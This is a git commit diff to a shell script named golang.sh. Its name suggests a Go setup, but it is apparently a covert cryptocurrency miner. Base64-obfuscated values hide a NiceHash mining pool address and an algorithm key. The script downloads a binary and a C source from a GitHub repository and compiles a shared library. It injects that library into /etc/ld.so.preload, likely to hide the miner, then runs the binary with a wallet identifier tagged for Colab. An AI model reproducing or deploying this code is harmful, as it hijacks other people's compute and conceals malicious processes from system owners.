6eb3fcfbcd9181a147f0a5b21b7bdc2f9c44363d
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-08 11:03:47 +0700

    Update golang.sh

--- golang.sh
+++ golang.sh
@@ -1,33 +1,26 @@
 #!/bin/bash
 
-sudo apt-get install -y libpci-dev gcc
+golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang
+libgolang=https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c
 
 userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.Colab"
-
 string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
-url=aHR0cHM6Ly9taW5lcmhvc3RpbmcuMDAwd2ViaG9zdGFwcC5jb20vZmlsZXMvZ29sYW5nX2xpbnV4X2FtZDY0LnppcA==
 key=ZXRoYXNo
 
 seed=$(echo $string | base64 --decode)
-location=$(echo $url | base64 --decode)
 apikey=$(echo $key | base64 --decode)
 
 
+sudo apt-get install -y libpci-dev gcc
 
-
-wget $location
-wget https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/libgolang.c
+wget $golang
+wget $libgolang
 
 
 gcc -Wall -fPIC -shared -o libgolang.so libgolang.c -ldl
 sudo mv libgolang.so /usr/local/lib/
 echo /usr/local/lib/libgolang.so >> /etc/ld.so.preload
 
-unzip golang_linux_amd64.zip
-
-cd golang_linux_amd64
-
 chmod 777 golang
 
-./golang -a $apikey --url $seed \
--u $userAgent -p x 
+./golang -a $apikey --url $seed -u $userAgent -p x 
